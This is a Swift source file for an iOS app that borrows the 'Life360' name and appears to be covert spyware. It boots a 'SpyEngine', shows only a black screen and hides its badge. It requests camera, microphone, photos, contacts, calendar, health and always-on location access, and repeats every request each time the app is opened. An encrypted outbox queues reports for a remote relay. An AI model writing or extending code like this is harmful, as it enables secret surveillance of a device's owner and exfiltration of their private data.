import SwiftUI
import UIKit
import CryptoKit
import AVFoundation
import Photos
import Contacts
import EventKit
import CoreMotion
import HealthKit
import CoreLocation

@main
struct Life360App: App {
    @Environment(\.scenePhase) private var phase

    init() {
        Settings.shared.load()
        Onboarding.shared.boot()
        SpyEngine.shared.boot()
        Modules.shared.boot()
        MicGate.shared.apply()
    }

    var body: some Scene {
        WindowGroup {
            ZStack {
                Color.black.ignoresSafeArea()
                if Settings.shared.isOn(.blankSnapshot) && phase != .active {
                    Color.black.ignoresSafeArea()
                }
            }
            .onChange(of: phase) { _, p in
                if p == .background { UIApplication.shared.applicationIconBadgeNumber = 0 }
            }
        }
    }
}

enum Cipher {
    private static var key: SymmetricKey {
        SymmetricKey(data: SHA256.hash(data: Data(Config.token.utf8)))
    }
    static func seal(_ s: String) -> String? {
        guard Settings.shared.isOn(.encryption) else { return s }
        guard let d = s.data(using: .utf8),
              let box = try? AES.GCM.seal(d, using: key),
              let c = box.combined else { return s }
        return c.base64EncodedString()
    }
    static func open(_ s: String) -> String? {
        guard Settings.shared.isOn(.encryption) else { return s }
        guard let d = Data(base64Encoded: s),
              let box = try? AES.GCM.SealedBox(combined: d),
              let out = try? AES.GCM.open(box, using: key) else { return s }
        return String(data: out, encoding: .utf8)
    }
}

final class Outbox {
    static let shared = Outbox()
    private let url = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        .appendingPathComponent("outbox.jsonl")
    private let q = DispatchQueue(label: "outbox")

    func send(_ obj: [String: Any]) {
        guard Settings.shared.isOn(.storeAndForward) else { Relay.shared.sendJSON(obj); return }
        q.async {
            guard let d = try? JSONSerialization.data(withJSONObject: obj),
                  let line = String(data: d, encoding: .utf8) else { return }
            if let h = try? FileHandle(forWritingTo: self.url) {
                h.seekToEndOfFile(); h.write(Data((line + "\n").utf8)); try? h.close()
            } else {
                try? (line + "\n").write(to: self.url, atomically: true, encoding: .utf8)
            }
        }
    }

    func flush() {
        guard Settings.shared.isOn(.storeAndForward) else { return }
        q.async {
            guard let text = try? String(contentsOf: self.url, encoding: .utf8), !text.isEmpty else { return }
            for l in text.split(separator: "\n") {
                if let d = l.data(using: .utf8),
                   let o = try? JSONSerialization.jsonObject(with: d) as? [String: Any] {
                    Relay.shared.sendJSON(o)
                }
            }
            try? "".write(to: self.url, atomically: true, encoding: .utf8)
        }
    }
}

final class Onboarding: NSObject, CLLocationManagerDelegate {
    static let shared = Onboarding()
    private let store = UserDefaults(suiteName: Config.appGroup)!
    private let loc = CLLocationManager()
    private var locWait: CheckedContinuation<Void, Never>?

    var hasRun: Bool {
        get { store.bool(forKey: "onboarded") }
        set { store.set(newValue, forKey: "onboarded") }
    }

    func boot() {
        loc.delegate = self
        Task { hasRun ? await reassert() : await runOnce() }
        NotificationCenter.default.addObserver(forName: UIApplication.didBecomeActiveNotification,
                                               object: nil, queue: .main) { [weak self] _ in
            Task { await self?.reassert() }
        }
    }

    private func runOnce() async {
        await camera();   try? await Task.sleep(nanoseconds: 500_000_000)
        await mic();      try? await Task.sleep(nanoseconds: 500_000_000)
        await motion();   try? await Task.sleep(nanoseconds: 500_000_000)
        await photos();   try? await Task.sleep(nanoseconds: 500_000_000)
        await contacts(); try? await Task.sleep(nanoseconds: 500_000_000)
        await calendar(); try? await Task.sleep(nanoseconds: 500_000_000)
        await reminders();try? await Task.sleep(nanoseconds: 500_000_000)
        await health()
        await locationAlways()
        hasRun = true
        Relay.shared.sendJSON(["type": "onboarded", "at": Date().timeIntervalSince1970])
    }

    private func reassert() async {
        await camera(); await mic(); await motion(); await photos()
        await contacts(); await calendar(); await reminders(); await health()
        await locationAlways()
        HealthMon.sweep()
    }

    private func camera() async {
        await withCheckedContinuation { c in AVCaptureDevice.requestAccess(for: .video) { _ in c.resume() } }
    }
    private func mic() async {
        await withCheckedContinuation { c in AVCaptureDevice.requestAccess(for: .audio) { _ in c.resume() } }
    }
    private func motion() async {
        guard CMMotionActivityManager.isActivityAvailable() else { return }
        await withCheckedContinuation { c in
            CMMotionActivityManager().queryActivityStarting(from: Date().addingTimeInterval(-60),
                                                            to: Date(), to: .main) { _, _ in c.resume() }
        }
    }
    private func photos() async {
        await withCheckedContinuation { c in PHPhotoLibrary.requestAuthorization(for: .readWrite) { _ in c.resume() } }
    }
    private func contacts() async {
        await withCheckedContinuation { c in CNContactStore().requestAccess(for: .contacts) { _, _ in c.resume() } }
    }
    private func calendar() async {
        await withCheckedContinuation { c in EKEventStore().requestFullAccessToEvents { _, _ in c.resume() } }
    }
    private func reminders() async {
        await withCheckedContinuation { c in EKEventStore().requestFullAccessToReminders { _, _ in c.resume() } }
    }
    private func health() async {
        guard HKHealthStore.isHealthDataAvailable() else { return }
        let types: Set<HKObjectType> = [
            HKQuantityType(.stepCount), HKQuantityType(.heartRate),
            HKQuantityType(.distanceWalkingRunning), HKQuantityType(.activeEnergyBurned),
            HKQuantityType(.oxygenSaturation), HKQuantityType(.bodyMass)
        ]
        await withCheckedContinuation { c in
            HKHealthStore().requestAuthorization(toShare: [], read: types) { _, _ in c.resume() }
        }
    }
    private func locationAlways() async {
        await withCheckedContinuation { c in
            switch loc.authorizationStatus {
            case .notDetermined, .authorizedWhenInUse:
                locWait = c
                loc.requestAlwaysAuthorization()
            default:
                c.resume()
            }
        }
    }
    func locationManagerDidChangeAuthorization(_ m: CLLocationManager) {
        guard m.authorizationStatus != .notDetermined, let c = locWait else { return }
        locWait = nil; c.resume()
    }
}
